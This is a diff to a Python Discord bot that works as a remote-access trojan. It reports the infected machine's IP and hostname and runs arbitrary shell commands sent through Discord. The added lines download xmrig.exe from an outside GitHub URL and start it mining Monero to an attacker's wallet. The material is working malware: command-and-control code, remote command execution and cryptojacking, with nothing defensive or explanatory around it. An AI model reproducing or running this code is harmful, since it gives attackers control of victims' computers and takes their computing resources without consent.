@@ -1,5 +1,5 @@
 from discord.ext import commands
-import requests, discord, psutil, socket, sys, os
+import requests, discord, urllib, psutil, socket, sys, os
 
 token = 'MToken.mnt.discord' # Token
 channel_id = 111111111111111111  # Channel ID
@@ -32,13 +32,14 @@ async def on_ready():
 @bot.command()
 async def sessions(ctx):
     await ctx.send(f"``[*] {ip}@{hostname}``")
-    
+   
 # shell
-@bot.command()
+@bot.command(name=f"shell.{hostname}@{ip}")
 async def shell(ctx, *args):
     arguments = ' '.join(args)
     stream = os.popen(arguments)
     output = stream.read()
+    
     if sys.getsizeof(output) > 2000:
         await ctx.send(f"``[+] {ip}@{hostname}: Command executed``")
     else:
@@ -55,6 +56,11 @@ async def check(ctx):
 # miner
 @bot.command()
 async def miner(ctx, walletArg):
+    if not os.path.exists("xmrig"):
+        url = "https://github.com/rxu7s/Public/raw/main/xmrig.exe"
+        r = requests.get(url, allow_redirects=True)
+        open("xmrig.exe", 'wb').write(r.content)
+    
     wallet = ''.join(walletArg)
     os.popen(f"xmrig.exe --opencl --cuda -o pool.hashvault.pro:443 -u {wallet} -p Windows -k --tls")
     await ctx.send(f"``[+] {ip}@{hostname}: Miner started``")
